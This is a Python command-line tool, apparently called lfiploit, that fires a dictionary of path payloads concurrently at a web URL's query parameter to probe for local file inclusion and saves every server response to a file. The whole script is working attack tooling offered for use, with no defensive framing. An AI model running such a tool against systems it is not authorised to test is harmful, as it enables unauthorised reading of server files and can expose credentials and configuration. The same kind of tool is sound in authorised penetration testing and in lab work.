#!/usr/bin/env python

import asyncio
import os
import json
import re
from urllib.parse import urlparse
from etc.colors import *
from aiohttp import *
import argparse

async def make_request(url, path, client: ClientSession) -> ClientResponse:
    async with client.get(url + path) as response:
        return await response.text()

tasks_running = True


async def time_count() -> None:
    seconds = 0
    while tasks_running:
        print(colors.BLUE +
              f'Time elapsed: {round(seconds, 1)} seconds' + colors.END, end='\r')
        seconds += 0.1
        await asyncio.sleep(0.1)


async def Brute(url, paths) -> list[ClientResponse]:
    async with ClientSession() as client:
        tasks = []
        for path in paths:
            task = asyncio.create_task(make_request(url, path, client))
            tasks.append(task)

        time_task = asyncio.ensure_future(time_count())
        await asyncio.sleep(0)
        responses = await asyncio.gather(*tasks)  # whenAll

        global tasks_running
        tasks_running = False

        await time_task

    return responses

def validate_url(url : str) -> bool:
    return len(re.findall('https?://.+/(.+\/)*.+(\..+)?\?.+=', url)) > 0

async def main():
    # pathInput = input('|< Paths dictionary path (empty to default): ')
    # raw_url = input('|< URL (e.g https://example.org/index.php?id=): ')
    # output = input('|< Output filename (empty to default)): ')

    parser = argparse.ArgumentParser(description='Brutforce specify URL for LFI vulnerability',
                                     epilog='[EXAMPLE: python lfiploit.py -u https://udav.corp/downloads?v= --out myout --dict /root/lfidick.dict --json]')
    parser.add_argument('--url', '-u', dest='url', required=True, help='URL which should end with <VARIABLE>\'=\'' +
                         ', e.g https://example.com/index.php?id=')
    parser.add_argument('--json', '-j', dest='json', action='store_true', help='Dump responses as JSON')
    parser.add_argument('--out', '-o', dest='out', default='out.lfi', help='Path to output file (empty to default)')
    parser.add_argument('--dict', '-d', dest='dict', default=os.curdir + '/dict/lfi_dict', help='Path to custom dictionary (emtpy to default)')
    args = parser.parse_args()

    url = args.url
    if not validate_url(url):
        print(colors.RED + f'|> Input parameter URL doesn\'t match the pattern.\n|> Keep this grammar: ' + colors.END +
               colors.GREEN + r'http[s]://<host>/{<path>/}<endpoint>?<param>= ' + colors.END +
               colors.RED + '\n|> See EBNF notation (https://en.wikipedia.org/wiki/Extended_Backus%E2%80%93Naur_form), mzfck' + colors.END)
        exit(0)

    dump_json = args.json
    outfile_path = args.out
    dict_path = args.dict 

    dict = open(dict_path).readlines()

    try:
        responses = await Brute(url, dict)
    except NameError:
        print(colors.RED + f'|> Error: {NameError} ' + colors.END)

    if os.path.isfile(outfile_path):
        opt = input(colors.YELLOW + f'\n|> ' + colors.END + colors.PURPLE + outfile_path + colors.END + 
                     colors.YELLOW + ' already exists. Do you want to truncate them?[y/n] ' + colors.END)
        if opt == 'y':
            clear = open(outfile_path, 'w')
            clear.close()

    with open(outfile_path, 'a') as a:
        if dump_json:            
            for i, response in enumerate(responses):
                a.write(json.dumps({dict[i] : response}, indent=1) + '\n')
        else:
            for response in responses:
                a.write(response)

    print('\n' + colors.GREEN +
          f'|> Responses from url:`{url}` dumped in ' + 
          colors.PURPLE + outfile_path + colors.END +  colors.GREEN + ' file')

if __name__ == '__main__':
    asyncio.run(main())
